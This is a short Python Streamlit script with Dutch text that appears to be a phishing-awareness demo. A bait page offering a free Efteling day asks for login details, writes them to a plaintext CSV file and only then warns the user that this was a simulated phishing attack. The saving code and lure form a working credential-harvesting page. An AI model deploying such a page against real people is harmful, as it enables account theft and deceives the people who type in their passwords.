import streamlit as st
import pandas as pd
import os

# Bestandsnaam voor het opslaan van de gegevens
file_name = 'phishing_data.csv'

# Functie om gegevens op te slaan
def save_data(username, password):
   # Als het bestand nog niet bestaat, maak het aan met een header
   if not os.path.exists(file_name):  # Zorg ervoor dat het bestand correct wordt gecontroleerd
       df = pd.DataFrame(columns=['Username', 'Password'])
       df.to_csv(file_name, index=False)

   # Voeg de nieuwe gegevens toe aan het bestand
   df = pd.DataFrame([[username, password]], columns=['Username', 'Password'])
   df.to_csv(file_name, mode='a', header=False, index=False)  # Gebruik mode='a' voor append en header=False

# Titel van de pagina
st.title('Gratis dagje naar de efteling!')

# Instructies voor de gebruiker
st.write("Om gratis naar de efteling te kunnen voer hier uw e-mail en wachtwoord in.")

# Invoer van de nep-loginpagina
username = st.text_input("Gebruikersnaam")
password = st.text_input("Wachtwoord", type="password")

# Simuleer wat er gebeurt als iemand inlogt
if st.button('Inloggen'):
   if username and password:
       # Sla de gegevens op in een CSV-bestand
       save_data(username, password)

       # Feedback voor de gebruiker
       st.write(f"Gebruikersnaam: {username}")
       st.write(f"Wachtwoord: {password}")
       st.write("Let op! Dit zou een phishing-aanval kunnen zijn. Je gegevens worden opgeslagen en kunnen door kwaadwillenden gebruikt worden!")

       # Feedback voor de uitleg achteraf
       st.write("In deze simulatie worden de inloggegevens opgeslagen. Dit is hoe hackers vaak toegang krijgen tot je gegevens!")
   else:
       st.write("Vul alstublieft je gebruikersnaam en wachtwoord in.")
